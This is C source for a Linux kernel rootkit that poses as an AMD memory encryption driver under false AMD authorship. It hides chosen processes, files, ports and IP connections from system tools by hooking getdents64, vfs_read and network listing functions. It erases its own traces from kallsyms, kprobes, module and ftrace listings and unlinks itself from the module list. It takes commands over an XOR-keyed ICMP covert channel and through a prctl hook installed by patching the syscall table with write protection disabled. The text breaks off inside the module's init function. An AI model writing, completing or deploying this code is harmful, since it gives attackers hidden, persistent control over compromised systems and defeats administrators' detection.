/*
 * Linux 5.x Full Stealth Module - C2 Integration Version
 * 
 * Target Kernels:
 * - Ubuntu 20.04 LTS (5.4, 5.15 HWE)
 * - Ubuntu 22.04 LTS (5.15, 6.2 HWE)
 * - Debian 11 (5.10)
 * - Rocky/AlmaLinux 9 (5.14)
 * 
 * Features:
 * - ftrace hook for getdents64 (syscall table no longer accessible)
 * - ftrace hook for vfs_read (module hiding via list_del + vfs_read filter)
 * - vfs_read filter for kallsyms/kprobes/modules
 * - netstat hiding (tcp/udp_seq_show kretprobe)
 * - ICMP covert channel for C2 commands
 * - procfs interface (/proc/.vl) - optional C2 interface
 * - ss hiding via kretprobe (inet_sk_diag_fill) - fallback if eBPF unavailable
 * - 5.7+ kallsyms_lookup_name via kprobe (no longer exported)
 * - Module show/hide capability via prctl
 * 
 * C2 Commands via ICMP (magic=0xC0DE, key=0x42):
 * - prctl(0x564C, cmd, arg, 0, 0)
 *   cmd=1: hide_port (arg=port)
 *   cmd=2: hide_pid (arg=PID)
 *   cmd=3: hide_file (arg=pointer to prefix)
 *   cmd=4: clear all
 *   cmd=5: mod_show (unhide module)
 *   cmd=6: stealth mode (arg=1 enable, arg=0 disable)
 * 
 * ICMP Commands:
 * - 0x01: hide_pid
 * - 0x02: hide_port
 * - 0x03: hide_file
 * - 0x04: show_mod
 * - 0x12: hide_ip
 * - 0x13: hide_ipport
 * - 0x20: set_key
 * - 0xFE: self_destruct
 * - 0xFF: clear
 * 
 * Extracted from binbash2.txt lines 1709-2797
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/ftrace.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/rwlock.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/fdtable.h>
#include <linux/tcp.h>
#include <linux/inet.h>
#include <linux/icmp.h>
#include <linux/ip.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/namei.h>
#include <linux/dcache.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/pid.h>
#include <linux/cred.h>
#include <linux/rculist.h>
#include <net/sock.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <net/inet_sock.h>
#include <net/inet_timewait_sock.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Advanced Micro Devices, Inc.");
MODULE_DESCRIPTION("AMD Memory Encryption Support");
MODULE_VERSION("3.0");

static ushort init_ports[8] = {0};
static int init_ports_count = 0;
module_param_array(init_ports, ushort, &init_ports_count, 0444);
MODULE_PARM_DESC(init_ports, "Initial ports to hide");

static int init_pids[8] = {0};
static int init_pids_count = 0;
module_param_array(init_pids, int, &init_pids_count, 0444);
MODULE_PARM_DESC(init_pids, "Initial PIDs to hide");

static char *init_prefix = NULL;
module_param(init_prefix, charp, 0444);
MODULE_PARM_DESC(init_prefix, "Initial file prefix to hide");

static bool stealth = true;
module_param(stealth, bool, 0444);
MODULE_PARM_DESC(stealth, "Enable stealth mode (default: true)");

// Configuration limits
#define MAX_PIDS         64
#define MAX_PORTS        64
#define MAX_PREFIXES     32
#define MAX_IPS          32
#define PREFIX_MAXLEN    64
#define ICMP_DATA_MAX    62
#define KRETPROBE_MAXACTIVE 100

// ICMP command codes
#define ICMP_CMD_HIDE_PID      0x01
#define ICMP_CMD_HIDE_PORT     0x02
#define ICMP_CMD_HIDE_FILE     0x03
#define ICMP_CMD_SHOW_MOD      0x04
#define ICMP_CMD_SELF_DESTRUCT 0xFE
#define ICMP_CMD_CLEAR         0xFF
#define ICMP_CMD_HIDE_IP       0x12
#define ICMP_CMD_HIDE_IPPORT   0x13
#define ICMP_CMD_SET_KEY       0x20

// Data structures
struct linux_dirent64 {
    u64 d_ino;
    s64 d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[1];
};

struct icmp_cmd {
    u8 cmd;
    u8 len;
    u8 data[ICMP_DATA_MAX];
} __attribute__((packed));

struct hide_endpoint {
    __be32 ip4;
    u16 port;
};

// Global data with lock protection
static struct {
    rwlock_t lock;
    pid_t pids[MAX_PIDS];
    int pids_count;
    u16 ports[MAX_PORTS];
    int ports_count;
    struct hide_endpoint ips[MAX_IPS];
    int ips_count;
    char prefixes[MAX_PREFIXES][PREFIX_MAXLEN];
    int prefixes_count;
    bool active;
} g_data = {
    .lock = __RW_LOCK_UNLOCKED(g_data.lock),
    .active = false,
};

// Global configuration
static struct {
    u16 icmp_magic;
    u8 icmp_key;
    bool stealth_mode;
} g_config = {
    .icmp_magic = 0xC0DE,
    .icmp_key = 0x42,
    .stealth_mode = true,
};

// Module hiding state
static struct {
    struct mutex lock;
    struct list_head *prev;
    bool hidden;
} g_mod = {
    .lock = __MUTEX_INITIALIZER(g_mod.lock),
    .hidden = false,
};

// Disable printk to avoid detection
#define pr_fmt(fmt) ""
#undef pr_info
#undef pr_err
#undef pr_warn
#define pr_info(fmt, ...) do {} while(0)
#define pr_err(fmt, ...) do {} while(0)
#define pr_warn(fmt, ...) do {} while(0)

// ============= kallsyms_lookup_name for 5.7+ (no longer exported) =============
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t ksym_lookup = NULL;

static int init_kallsyms(void)
{
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    int ret;
    
    ret = register_kprobe(&kp);
    if (ret < 0)
        return ret;
    
    ksym_lookup = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
    
    return ksym_lookup ? 0 : -ENOENT;
}

// ============= Symbol lookup with kprobe fallback =============
static unsigned long lookup_name_kprobe(const char *name)
{
    struct kprobe kp = {};
    unsigned long addr = 0;
    
    kp.symbol_name = name;
    if (register_kprobe(&kp) == 0) {
        addr = (unsigned long)kp.addr;
        unregister_kprobe(&kp);
    }
    return addr;
}

static unsigned long lookup_name(const char *name)
{
    unsigned long addr;
    char alt_name[128];
    int i;
    
    // Try kallsyms_lookup_name first
    if (ksym_lookup) {
        addr = ksym_lookup(name);
        if (addr)
            return addr;
    }
    
    // Fallback to kprobe
    addr = lookup_name_kprobe(name);
    if (addr)
        return addr;
    
    // Try .isra.X suffixes
    for (i = 0; i < 20; i++) {
        snprintf(alt_name, sizeof(alt_name), "%s.isra.%d", name, i);
        if (ksym_lookup) {
            addr = ksym_lookup(alt_name);
            if (addr)
                return addr;
        }
        addr = lookup_name_kprobe(alt_name);
        if (addr)
            return addr;
    }
    
    // Try .constprop.X suffixes
    for (i = 0; i < 10; i++) {
        snprintf(alt_name, sizeof(alt_name), "%s.constprop.%d", name, i);
        if (ksym_lookup) {
            addr = ksym_lookup(alt_name);
            if (addr)
                return addr;
        }
    }
    
    // Try .part.X suffixes
    for (i = 0; i < 10; i++) {
        snprintf(alt_name, sizeof(alt_name), "%s.part.%d", name, i);
        if (ksym_lookup) {
            addr = ksym_lookup(alt_name);
            if (addr)
                return addr;
        }
    }
    
    return 0;
}

// ============= Check functions =============
static bool chk_pid(pid_t pid)
{
    bool found = false;
    int i;
    read_lock(&g_data.lock);
    for (i = 0; i < g_data.pids_count; i++) {
        if (g_data.pids[i] == pid) { found = true; break; }
    }
    read_unlock(&g_data.lock);
    return found;
}

static bool chk_port(u16 port)
{
    bool found = false;
    int i;
    read_lock(&g_data.lock);
    for (i = 0; i < g_data.ports_count; i++) {
        if (g_data.ports[i] == port) { found = true; break; }
    }
    read_unlock(&g_data.lock);
    return found;
}

static bool chk_ip(__be32 ip, u16 port)
{
    bool found = false;
    int i;
    read_lock(&g_data.lock);
    for (i = 0; i < g_data.ips_count; i++) {
        if (g_data.ips[i].ip4 == ip) {
            if (g_data.ips[i].port == 0 || g_data.ips[i].port == port) {
                found = true;
                break;
            }
        }
    }
    read_unlock(&g_data.lock);
    return found;
}

static bool chk_name(const char *name, size_t len)
{
    bool found = false;
    int i;
    read_lock(&g_data.lock);
    for (i = 0; i < g_data.prefixes_count; i++) {
        size_t plen = strlen(g_data.prefixes[i]);
        if (len >= plen && memcmp(name, g_data.prefixes[i], plen) == 0) {
            found = true;
            break;
        }
    }
    read_unlock(&g_data.lock);
    return found;
}

// ============= ftrace hook infrastructure =============
struct ftrace_hook {
    const char *name;
    void *hook;
    void *orig;
    unsigned long addr;
    struct ftrace_ops ops;
    bool active;
};

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,11,0)
static void notrace ftrace_callback(unsigned long ip, unsigned long parent_ip,
                                     struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct ftrace_hook *h = container_of(ops, struct ftrace_hook, ops);
    struct pt_regs *regs = ftrace_get_regs(fregs);
    
    if (!regs) return;
    if (within_module(parent_ip, THIS_MODULE)) return;
    
    regs->ip = (unsigned long)h->hook;
}
#else
static void notrace ftrace_callback(unsigned long ip, unsigned long parent_ip,
                                     struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct ftrace_hook *h = container_of(ops, struct ftrace_hook, ops);
    
    if (within_module(parent_ip, THIS_MODULE)) return;
    
    regs->ip = (unsigned long)h->hook;
}
#endif

static int install_ftrace_hook(struct ftrace_hook *h)
{
    int err;
    
    if (!h->addr) return -ENOENT;
    
    *((unsigned long *)h->orig) = h->addr;
    
    h->ops.func = ftrace_callback;
    h->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,11,0)
                 | FTRACE_OPS_FL_RECURSION
#endif
                 ;
    
    err = ftrace_set_filter_ip(&h->ops, h->addr, 0, 0);
    if (err) return err;
    
    err = register_ftrace_function(&h->ops);
    if (err) {
        ftrace_set_filter_ip(&h->ops, h->addr, 1, 0);
        return err;
    }
    
    h->active = true;
    return 0;
}

static void remove_ftrace_hook(struct ftrace_hook *h)
{
    if (!h->active) return;
    unregister_ftrace_function(&h->ops);
    ftrace_set_filter_ip(&h->ops, h->addr, 1, 0);
    h->active = false;
}

// ============= getdents64 hook (ftrace) =============
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    long ret;
    struct linux_dirent64 __user *dirent;
    struct linux_dirent64 *kbuf, *cur, *prev;
    unsigned long off;
    bool hide;
    
    ret = orig_getdents64(regs);
    if (ret <= 0 || !g_data.active)
        return ret;
    
    dirent = (struct linux_dirent64 __user *)regs->si;
    
    kbuf = kmalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;
    
    if (copy_from_user(kbuf, dirent, ret)) {
        kfree(kbuf);
        return ret;
    }
    
    off = 0;
    prev = NULL;
    while (off < ret) {
        cur = (void *)kbuf + off;
        hide = false;
        
        // Check for numeric PID
        if (cur->d_name[0] >= '1' && cur->d_name[0] <= '9') {
            pid_t pid = 0;
            const char *p = cur->d_name;
            while (*p >= '0' && *p <= '9') {
                pid = pid * 10 + (*p - '0');
                p++;
            }
            if (*p == '\0' && chk_pid(pid))
                hide = true;
        }
        
        // Check for file prefix
        if (!hide && chk_name(cur->d_name, strlen(cur->d_name)))
            hide = true;
        
        // Hide module name in stealth mode
        if (!hide && g_config.stealth_mode && 
            strcmp(cur->d_name, "amd_mem_encrypt") == 0)
            hide = true;
        
        if (hide) {
            if (prev)
                prev->d_reclen += cur->d_reclen;
            else {
                memmove(kbuf, (void *)kbuf + cur->d_reclen, ret - cur->d_reclen);
                ret -= cur->d_reclen;
                continue;
            }
        } else {
            prev = cur;
        }
        off += cur->d_reclen;
    }
    
    if (copy_to_user(dirent, kbuf, ret)) {
        // copy_to_user failed, return original
        kfree(kbuf);
        return orig_getdents64(regs);
    }
    
    kfree(kbuf);
    return ret;
}

// ============= TCP/UDP seq_show kretprobe (netstat hiding) =============
struct seq_hide_data {
    int should_hide;
    size_t orig_count;
    struct seq_file *seq;
};

static int seq_entry_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct seq_hide_data *data = (struct seq_hide_data *)ri->data;
    struct seq_file *seq = (struct seq_file *)regs->di;
    void *v = (void *)regs->si;
    struct sock *sk;
    struct inet_sock *inet;
    
    data->should_hide = 0;
    data->seq = seq;
    data->orig_count = seq ? seq->count : 0;
    
    if (!g_data.active || v == SEQ_START_TOKEN)
        return 0;
    
    sk = v;
    if (!sk)
        return 0;
    
    // TIME_WAIT state
    if (sk->sk_state == TCP_TIME_WAIT) {
        struct inet_timewait_sock *tw = inet_twsk(sk);
        if (tw) {
            if (chk_port(ntohs(tw->tw_sport)) || chk_port(ntohs(tw->tw_dport)))
                data->should_hide = 1;
            else if (chk_ip(tw->tw_daddr, ntohs(tw->tw_dport)))
                data->should_hide = 1;
            else if (chk_ip(tw->tw_rcv_saddr, ntohs(tw->tw_sport)))
                data->should_hide = 1;
        }
        return 0;
    }
    
    inet = inet_sk(sk);
    if (!inet)
        return 0;
    
    // Check source port
    if (chk_port(ntohs(inet->inet_sport)) || chk_port(ntohs(inet->inet_dport)))
        data->should_hide = 1;
    // Check destination IP:port
    else if (chk_ip(inet->inet_daddr, ntohs(inet->inet_dport)))
        data->should_hide = 1;
    // Check source IP:port
    else if (chk_ip(inet->inet_saddr, ntohs(inet->inet_sport)))
        data->should_hide = 1;
    
    return 0;
}

static int seq_ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct seq_hide_data *data = (struct seq_hide_data *)ri->data;
    
    // Revert seq_file count to hide entry
    if (data->should_hide && data->seq)
        data->seq->count = data->orig_count;
    
    return 0;
}

// kretprobe structures - netstat hiding
static struct kretprobe tcp4_krp = {
    .handler = seq_ret_handler,
    .entry_handler = seq_entry_handler,
    .data_size = sizeof(struct seq_hide_data),
    .maxactive = KRETPROBE_MAXACTIVE,
};

static struct kretprobe tcp6_krp = {
    .handler = seq_ret_handler,
    .entry_handler = seq_entry_handler,
    .data_size = sizeof(struct seq_hide_data),
    .maxactive = KRETPROBE_MAXACTIVE,
};

static struct kretprobe udp4_krp = {
    .handler = seq_ret_handler,
    .entry_handler = seq_entry_handler,
    .data_size = sizeof(struct seq_hide_data),
    .maxactive = KRETPROBE_MAXACTIVE,
};

static struct kretprobe udp6_krp = {
    .handler = seq_ret_handler,
    .entry_handler = seq_entry_handler,
    .data_size = sizeof(struct seq_hide_data),
    .maxactive = KRETPROBE_MAXACTIVE,
};

static bool tcp4_hooked = false;
static bool tcp6_hooked = false;
static bool udp4_hooked = false;
static bool udp6_hooked = false;

// ============= ss hiding (kretprobe inet_sk_diag_fill) =============
struct ss_hide_data {
    int should_hide;
    size_t orig_len;
    struct sk_buff *skb;
};

static int ss_entry_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct ss_hide_data *data = (struct ss_hide_data *)ri->data;
    struct sock *sk = (struct sock *)regs->di;
    struct inet_sock *inet;
    u16 sport;
    
    data->should_hide = 0;
    data->skb = (struct sk_buff *)regs->dx;
    if (data->skb)
        data->orig_len = data->skb->len;
    
    if (!sk || !g_data.active)
        return 0;
    
    inet = (struct inet_sock *)sk;
    sport = ntohs(inet->inet_sport);
    
    if (chk_port(sport))
        data->should_hide = 1;
    
    return 0;
}

static int ss_ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct ss_hide_data *data = (struct ss_hide_data *)ri->data;
    
    if (data->should_hide && data->skb) {
        skb_trim(data->skb, data->orig_len);
        regs_set_return_value(regs, 0);
    }
    
    return 0;
}

static struct kretprobe ss_krp = {
    .handler = ss_ret_handler,
    .entry_handler = ss_entry_handler,
    .data_size = sizeof(struct ss_hide_data),
    .maxactive = 200,
};

static bool ss_hooked = false;

// ============= Helper: find symbol via kprobe =============
static unsigned long find_module_symbol(const char *name)
{
    struct kprobe kp_tmp = { .symbol_name = name };
    unsigned long addr = 0;
    
    if (register_kprobe(&kp_tmp) == 0) {
        addr = (unsigned long)kp_tmp.addr;
        unregister_kprobe(&kp_tmp);
    }
    
    return addr;
}

static void install_seq_hooks(void)
{
    unsigned long addr;
    
    // tcp4_seq_show (netstat)
    addr = lookup_name("tcp4_seq_show");
    if (addr) {
        tcp4_krp.kp.addr = (kprobe_opcode_t *)addr;
        if (register_kretprobe(&tcp4_krp) == 0)
            tcp4_hooked = true;
    }
    
    // tcp6_seq_show
    addr = lookup_name("tcp6_seq_show");
    if (addr) {
        tcp6_krp.kp.addr = (kprobe_opcode_t *)addr;
        if (register_kretprobe(&tcp6_krp) == 0)
            tcp6_hooked = true;
    }
    
    // udp4_seq_show
    addr = lookup_name("udp4_seq_show");
    if (addr) {
        udp4_krp.kp.addr = (kprobe_opcode_t *)addr;
        if (register_kretprobe(&udp4_krp) == 0)
            udp4_hooked = true;
    }
    
    // udp6_seq_show
    addr = lookup_name("udp6_seq_show");
    if (addr) {
        udp6_krp.kp.addr = (kprobe_opcode_t *)addr;
        if (register_kretprobe(&udp6_krp) == 0)
            udp6_hooked = true;
    }
    
    // inet_sk_diag_fill (ss hiding) - fallback kretprobe if eBPF unavailable
    addr = find_module_symbol("inet_sk_diag_fill");
    if (!addr)
        addr = lookup_name("inet_sk_diag_fill");
    if (addr) {
        ss_krp.kp.addr = (kprobe_opcode_t *)addr;
        if (register_kretprobe(&ss_krp) == 0) {
            ss_hooked = true;
            // Note: This is a fallback LKM kretprobe for ss hiding
            // Preferred method is eBPF loader: ./ss_loader -p <port> -d
        }
        // If this fails, eBPF loader should be used instead
    }
}

static void remove_seq_hooks(void)
{
    if (tcp4_hooked) { unregister_kretprobe(&tcp4_krp); tcp4_hooked = false; }
    if (tcp6_hooked) { unregister_kretprobe(&tcp6_krp); tcp6_hooked = false; }
    if (udp4_hooked) { unregister_kretprobe(&udp4_krp); udp4_hooked = false; }
    if (udp6_hooked) { unregister_kretprobe(&udp6_krp); udp6_hooked = false; }
    if (ss_hooked) { unregister_kretprobe(&ss_krp); ss_hooked = false; }
}

// ============= vfs_read hook (kallsyms/kprobes/modules filtering) =============
static asmlinkage ssize_t (*orig_vfs_read)(struct file *, char __user *, size_t, loff_t *);

#define FILE_UNKNOWN    0
#define FILE_KALLSYMS   1
#define FILE_KPROBES    2
#define FILE_MODULES    3
#define FILE_FTRACE     4

static int get_file_type(struct file *file)
{
    char buf[128];
    char *path;
    
    if (!file || !file->f_path.dentry)
        return FILE_UNKNOWN;
    
    path = dentry_path_raw(file->f_path.dentry, buf, sizeof(buf));
    if (IS_ERR(path))
        return FILE_UNKNOWN;
    
    if (strstr(path, "kallsyms"))
        return FILE_KALLSYMS;
    if (strstr(path, "kprobes/list"))
        return FILE_KPROBES;
    if (strstr(path, "proc/modules") || strcmp(path, "/modules") == 0)
        return FILE_MODULES;
    if (strstr(path, "enabled_functions") || strstr(path, "available_filter"))
        return FILE_FTRACE;
    
    return FILE_UNKNOWN;
}

static ssize_t filter_lines(char __user *buf, ssize_t count, const char *filter)
{
    char *kbuf, *src, *dst, *line_start, *line_end;
    ssize_t new_count;
    
    if (count <= 0)
        return count;
    
    kbuf = kmalloc(count + 1, GFP_KERNEL);
    if (!kbuf)
        return count;
    
    if (copy_from_user(kbuf, buf, count)) {
        kfree(kbuf);
        return count;
    }
    kbuf[count] = '\0';
    
    src = kbuf;
    dst = kbuf;
    
    while (*src) {
        line_start = src;
        line_end = strchr(src, '\n');
        if (!line_end)
            line_end = src + strlen(src);
        else
            line_end++;
        
        if (!strnstr(line_start, filter, line_end - line_start)) {
            if (dst != line_start)
                memmove(dst, line_start, line_end - line_start);
            dst += (line_end - line_start);
        }
        src = line_end;
    }
    
    new_count = dst - kbuf;
    if (new_count < count) {
        if (copy_to_user(buf, kbuf, new_count)) {
            kfree(kbuf);
            return count;  // Return original on error
        }
    }
    
    kfree(kbuf);
    return new_count;
}

static asmlinkage ssize_t hook_vfs_read(struct file *file, char __user *buf,
                                         size_t count, loff_t *pos)
{
    ssize_t ret;
    int ftype;
    
    ret = orig_vfs_read(file, buf, count, pos);
    
    if (!g_data.active || !g_config.stealth_mode || ret <= 0)
        return ret;
    
    ftype = get_file_type(file);
    
    switch (ftype) {
    case FILE_KALLSYMS:
        ret = filter_lines(buf, ret, "vl_stealth");
        ret = filter_lines(buf, ret, "amd_mem_encrypt");
        break;
    case FILE_KPROBES:
        ret = filter_lines(buf, ret, "tcp4_seq_show");
        ret = filter_lines(buf, ret, "tcp6_seq_show");
        ret = filter_lines(buf, ret, "udp4_seq_show");
        ret = filter_lines(buf, ret, "udp6_seq_show");
        ret = filter_lines(buf, ret, "inet_sk_diag_fill");
        break;
    case FILE_MODULES:
        ret = filter_lines(buf, ret, "vl_stealth");
        ret = filter_lines(buf, ret, "amd_mem_encrypt");
        break;
    case FILE_FTRACE:
        ret = filter_lines(buf, ret, "vl_stealth");
        ret = filter_lines(buf, ret, "ftrace_callback");
        ret = filter_lines(buf, ret, "tcp4_seq_show");
        ret = filter_lines(buf, ret, "tcp6_seq_show");
        ret = filter_lines(buf, ret, "udp4_seq_show");
        ret = filter_lines(buf, ret, "udp6_seq_show");
        ret = filter_lines(buf, ret, "inet_sk_diag_fill");
        ret = filter_lines(buf, ret, "hook_getdents");
        break;
    }
    
    return ret;
}

// ============= Module show/hide =============
static void mod_hide(void)
{
    mutex_lock(&g_mod.lock);
    if (!g_mod.hidden) {
        g_mod.prev = THIS_MODULE->list.prev;
        list_del_init(&THIS_MODULE->list);
        // Also hide from /sys/module/xxx
        kobject_del(&THIS_MODULE->mkobj.kobj);
        g_mod.hidden = true;
    }
    g_config.stealth_mode = true;
    mutex_unlock(&g_mod.lock);
}

static void mod_show(void)
{
    mutex_lock(&g_mod.lock);
    if (g_mod.hidden && g_mod.prev) {
        list_add(&THIS_MODULE->list, g_mod.prev);
        g_mod.hidden = false;
    }
    g_config.stealth_mode = false;
    mutex_unlock(&g_mod.lock);
}

// ============= ICMP C2 Handler =============
static void process_icmp_cmd(struct icmp_cmd *cmd)
{
    int i;
    u32 val;
    
    if (cmd->len > ICMP_DATA_MAX)
        cmd->len = ICMP_DATA_MAX;
    
    for (i = 0; i < cmd->len; i++)
        cmd->data[i] ^= g_config.icmp_key;
    
    switch (cmd->cmd) {
    case ICMP_CMD_HIDE_PID:
        if (cmd->len >= 4) {
            memcpy(&val, cmd->data, 4);
            write_lock(&g_data.lock);
            if (g_data.pids_count < MAX_PIDS)
                g_data.pids[g_data.pids_count++] = (pid_t)val;
            write_unlock(&g_data.lock);
        }
        break;
        
    case ICMP_CMD_HIDE_PORT:
        if (cmd->len >= 2) {
            u16 port;
            memcpy(&port, cmd->data, 2);
            write_lock(&g_data.lock);
            if (g_data.ports_count < MAX_PORTS)
                g_data.ports[g_data.ports_count++] = port;
            write_unlock(&g_data.lock);
        }
        break;
        
    case ICMP_CMD_HIDE_FILE:
        if (cmd->len > 0 && cmd->len < PREFIX_MAXLEN) {
            write_lock(&g_data.lock);
            if (g_data.prefixes_count < MAX_PREFIXES) {
                memcpy(g_data.prefixes[g_data.prefixes_count], cmd->data, cmd->len);
                g_data.prefixes[g_data.prefixes_count][cmd->len] = '\0';
                g_data.prefixes_count++;
            }
            write_unlock(&g_data.lock);
        }
        break;
        
    case ICMP_CMD_SHOW_MOD:
        mod_show();
        break;
        
    case ICMP_CMD_CLEAR:
        write_lock(&g_data.lock);
        g_data.pids_count = 0;
        g_data.ports_count = 0;
        g_data.prefixes_count = 0;
        g_data.ips_count = 0;
        write_unlock(&g_data.lock);
        break;
        
    case ICMP_CMD_HIDE_IP:
        if (cmd->len >= 4) {
            __be32 ip;
            memcpy(&ip, cmd->data, 4);
            write_lock(&g_data.lock);
            if (g_data.ips_count < MAX_IPS) {
                g_data.ips[g_data.ips_count].ip4 = ip;
                g_data.ips[g_data.ips_count].port = 0;
                g_data.ips_count++;
            }
            write_unlock(&g_data.lock);
        }
        break;
        
    case ICMP_CMD_HIDE_IPPORT:
        if (cmd->len >= 6) {
            __be32 ip;
            u16 port;
            memcpy(&ip, cmd->data, 4);
            memcpy(&port, cmd->data + 4, 2);
            write_lock(&g_data.lock);
            if (g_data.ips_count < MAX_IPS) {
                g_data.ips[g_data.ips_count].ip4 = ip;
                g_data.ips[g_data.ips_count].port = port;
                g_data.ips_count++;
            }
            write_unlock(&g_data.lock);
        }
        break;
        
    case ICMP_CMD_SET_KEY:
        if (cmd->len >= 3) {
            u16 new_magic;
            u8 new_key;
            memcpy(&new_magic, cmd->data, 2);
            new_key = cmd->data[2];
            g_config.icmp_magic = new_magic;
            g_config.icmp_key = new_key;
        }
        break;
        
    case ICMP_CMD_SELF_DESTRUCT:
        write_lock(&g_data.lock);
        g_data.pids_count = 0;
        g_data.ports_count = 0;
        g_data.prefixes_count = 0;
        g_data.ips_count = 0;
        g_data.active = false;
        write_unlock(&g_data.lock);
        mod_show();
        break;
    }
}

static struct nf_hook_ops nf_icmp_hook_prerouting;
static struct nf_hook_ops nf_icmp_hook_localin;

static unsigned int icmp_hook_func(void *priv, struct sk_buff *skb,
                                    const struct nf_hook_state *state)
{
    struct iphdr *iph;
    struct icmphdr *icmph;
    struct icmp_cmd *cmd;
    unsigned int data_len;
    
    if (!skb)
        return NF_ACCEPT;
    
    iph = ip_hdr(skb);
    if (!iph || iph->protocol != IPPROTO_ICMP)
        return NF_ACCEPT;
    
    icmph = (struct icmphdr *)((void *)iph + (iph->ihl * 4));
    if (!icmph || icmph->type != ICMP_ECHO)
        return NF_ACCEPT;
    
    if (ntohs(icmph->un.echo.id) != g_config.icmp_magic)
        return NF_ACCEPT;
    
    data_len = ntohs(iph->tot_len) - (iph->ihl * 4) - sizeof(struct icmphdr);
    if (data_len < 2)
        return NF_ACCEPT;
    
    cmd = (struct icmp_cmd *)((void *)icmph + sizeof(struct icmphdr));
    process_icmp_cmd(cmd);
    
    return NF_DROP;
}

// ============= ftrace hooks =============
static struct ftrace_hook hooks[] = {
    { .name = "__x64_sys_getdents64", .hook = hook_getdents64, .orig = &orig_getdents64 },
    { .name = "vfs_read", .hook = hook_vfs_read, .orig = &orig_vfs_read },
};

#define HOOKS_COUNT ARRAY_SIZE(hooks)

// ============= CR0 Write Protection =============
static inline void disable_wp(void)
{
    unsigned long cr0;
    preempt_disable();
    barrier();
    cr0 = read_cr0();
    write_cr0(cr0 & ~X86_CR0_WP);
    barrier();
}

static inline void enable_wp(void)
{
    unsigned long cr0;
    barrier();
    cr0 = read_cr0();
    write_cr0(cr0 | X86_CR0_WP);
    barrier();
    preempt_enable();
}

// ============= Syscall table =============
static unsigned long *sct = NULL;

// ============= prctl hook, C2 control interface =============
// Hook prctl for C2 commands
//   prctl(0x564C, cmd, arg, 0, 0)
// Commands (cmd):
//   1 = hide_port: arg is port number
//   2 = hide_pid: arg is PID
//   3 = hide_file: arg is pointer to prefix string
//   4 = clear: clear all hidden items
//   5 = mod_show: unhide module
//   6 = stealth: arg=1 enable, arg=0 disable

#define PRCTL_MAGIC 0x564C  // "VL" in hex

static asmlinkage long (*orig_prctl)(int option, unsigned long arg2,
                                     unsigned long arg3, unsigned long arg4,
                                     unsigned long arg5);

static asmlinkage long hk_prctl(int option, unsigned long arg2,
                                unsigned long arg3, unsigned long arg4,
                                unsigned long arg5)
{
    if (option == PRCTL_MAGIC) {
        int cmd = (int)arg2;
        unsigned long val = arg3;
        
        switch (cmd) {
        case 1: // hide_port
            write_lock(&g_data.lock);
            if (val > 0 && val < 65536 && g_data.ports_count < MAX_PORTS) {
                g_data.ports[g_data.ports_count++] = (u16)val;
            }
            write_unlock(&g_data.lock);
            return 0;
            
        case 2: // hide_pid
            write_lock(&g_data.lock);
            if (val > 0 && g_data.pids_count < MAX_PIDS) {
                g_data.pids[g_data.pids_count++] = (pid_t)val;
            }
            write_unlock(&g_data.lock);
            return 0;
            
        case 3: // hide_file (val is pointer to prefix)
            if (val) {
                char kbuf[PREFIX_MAXLEN];
                if (copy_from_user(kbuf, (char __user *)val, PREFIX_MAXLEN - 1) == 0) {
                    kbuf[PREFIX_MAXLEN - 1] = '\0';
                    if (strlen(kbuf) > 0) {
                        write_lock(&g_data.lock);
                        if (g_data.prefixes_count < MAX_PREFIXES) {
                            strncpy(g_data.prefixes[g_data.prefixes_count++], kbuf, PREFIX_MAXLEN - 1);
                        }
                        write_unlock(&g_data.lock);
                    }
                }
            }
            return 0;
            
        case 4: // clear
            write_lock(&g_data.lock);
            g_data.ports_count = 0;
            g_data.pids_count = 0;
            g_data.prefixes_count = 0;
            write_unlock(&g_data.lock);
            return 0;
            
        case 5: // mod_show (unhide module)
            mod_show();
            return 0;
            
        case 6: // stealth mode
            if (val)
                mod_hide();
            else
                mod_show();
            return 0;
            
        default:
            return -EINVAL;
        }
    }
    
    return orig_prctl(option, arg2, arg3, arg4, arg5);
}

static bool prctl_hooked = false;

static void setup_prctl_hook(void)
{
    sct = (unsigned long *)lookup_name("sys_call_table");
    if (!sct) return;
    
    orig_prctl = (void *)sct[__NR_prctl];
    disable_wp();
    sct[__NR_prctl] = (unsigned long)hk_prctl;
    enable_wp();
    prctl_hooked = true;
}

static void cleanup_prctl_hook(void)
{
    if (prctl_hooked && sct && orig_prctl) {
        disable_wp();
        sct[__NR_prctl] = (unsigned long)orig_prctl;
        enable_wp();
        prctl_hooked = false;
    }
}

// ============= Module init/exit =============
static int __init mod_init(void)
{
    int i, ret;
    
    g_config.stealth_mode = stealth;
    
    // Initialize kallsyms
    ret = init_kallsyms();
    if (ret < 0)
        return ret;
    
    // Setup ftrace hooks
    for (i = 0; i < HOOKS_COUNT; i++) {
        hooks[i].addr = lookup_name(hooks[i].name);
        if (!hooks[i].addr) {
            // Fallback for older kernel naming
            if (strcmp(hooks[i].name, "__x64_sys_getdents64") == 0)
                hooks[i].addr = lookup_name("ksys_getdents64");
        }
        if (hooks[i].addr)
